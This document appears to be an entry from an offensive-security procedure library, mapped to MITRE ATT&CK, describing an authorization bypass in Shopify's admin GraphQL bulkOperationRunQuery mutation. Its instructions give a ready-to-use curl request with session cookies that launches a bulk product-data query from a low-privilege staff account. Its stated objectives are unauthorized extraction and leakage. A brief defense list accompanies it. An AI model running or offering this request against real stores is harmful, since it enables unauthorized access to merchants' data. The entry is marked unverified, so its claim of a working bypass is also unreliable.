---
id: proc-uuid-2
tags:
  - graphql
  - bulk-operations
  - data-exposure
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/shopify-graphql-bulkoperationrunquery]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:53.525Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-Unauthorized-Bulk-Operation-Query-on-Products

## Summary

This procedure demonstrates executing a bulkOperationRunQuery mutation via Shopify's GraphQL API without permissions, allowing retrieval of sensitive product data such as IDs and titles, which can be processed asynchronously for exfiltration.

## Description

The bulkOperationRunQuery mutation on the admin GraphQL endpoint fails to enforce permission checks, permitting unauthorized staff to initiate queries on store data like products. The operation runs in the background, and results can be accessed later or via webhooks, exposing potentially large datasets without alerting the user.

## Requirements

1. Authenticated staff session
2. Access to GraphQL endpoint
3. Knowledge of GraphQL query syntax for bulk operations
4. Optional: Webhook from prior procedure to receive results

## Defense

Defensive measures and detection strategies:

- Enforce role-based access control (RBAC) on bulk operation mutations
- Log and alert on bulk query executions by low-privilege accounts
- Limit query scopes and paginate results to prevent mass data dumps
- Audit asynchronous operation completions for anomalies

## Objectives

1. Initiate unauthorized data extraction from store inventory
2. Obtain bulk operation ID for tracking
3. Facilitate data leakage through subsequent monitoring

## Instructions

### Step 1: Send the Bulk Query Mutation

**Context**: Define a GraphQL query to fetch product edges (nodes with id and title) and execute it via mutation, bypassing auth checks.

**Command** ([[commands/shopify-graphql-bulkoperationrunquery]]):
```bash
curl -X POST 'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=LoginNotificationsRead' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: _shopify_s=session; _shopify_y=session' \
  -d '{"query":"mutation { bulkOperationRunQuery( query: \\"{\\n products {\\n edges {\\n node {\\n id\\n title\\n }\\n }\\n }\\n}\\n\\" ) { bulkOperation { id status } userErrors { field message } } }","variables":null,"operationName":null}'
```

> The response includes bulkOperation.id and status (e.g., "RUNNING"). No userErrors indicate successful unauthorized execution. The query string targets products for data exposure.

### Step 2: Monitor Operation Progress

**Context**: Use the returned ID to check status in subsequent steps.

**Command** (Link to next procedure):
```bash
# Proceed to query currentBulkOperation for status
```

> Expected: Operation completes asynchronously, results available via API or webhook.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

-

## Commands Used

- [[commands/shopify-graphql-bulkoperationrunquery]]

## Tools Used

-

## Tags

- [[graphql]]
- [[bulk-operations]]
- [[data-exposure]]
